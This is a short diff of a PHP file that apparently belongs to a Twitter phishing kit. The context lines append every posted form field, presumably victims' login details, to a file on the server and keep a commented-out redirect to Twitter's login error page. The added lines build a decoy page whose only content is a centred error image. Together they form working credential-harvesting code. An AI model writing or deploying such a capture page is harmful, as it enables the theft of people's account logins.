@@ -29,3 +29,11 @@ file_put_contents($file, print_r($_POST, true), FILE_APPEND);
 ?>
 
 <!-- <meta http-equiv="refresh" content="0; url=https://twitter.com/login/error?username_or_email=&redirect_after_login=%2F%3Flang%3Del" /> -->
+
+
+<html>
+<head>
+</head>
+<body style="background-image:url(css/error.png); background-repeat: no-repeat; background-size: auto; background-position:center; background-color: #f7f7f7;">
+</body>
+</html>
